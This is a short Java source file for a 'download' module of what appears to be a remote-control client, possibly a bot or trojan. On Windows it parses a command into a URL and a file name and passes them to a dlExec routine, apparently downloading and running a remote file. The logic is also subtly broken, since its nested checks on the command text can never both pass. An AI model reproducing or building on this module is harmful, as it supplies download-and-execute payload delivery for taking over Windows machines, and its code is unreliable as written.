package syn.modules;

import syn.main.Client;
import syn.utils.Utilities;

public class DLModule extends Module {

	public DLModule() {
		super("download");
	}
	
	public void process() {
		Utilities uc = Client.getInstance().uc;
		
		String[] split = preCmd.split(":");
		if(uc.procOS(Client.getInstance().os).equals("WIN")) {
			if(cmd.equals("download")) {
				if(cmd.contains(" ")) {
					String[] dsplit = uc.getCmdTxt(split).split(" ");
					String url = dsplit[0];
					String file = dsplit[1];
					Client.getInstance().fileUtils.dlExec(url, file);
				} else {
					uc.write("Download command used incorrectly.");
				}
			}
		}
	}
}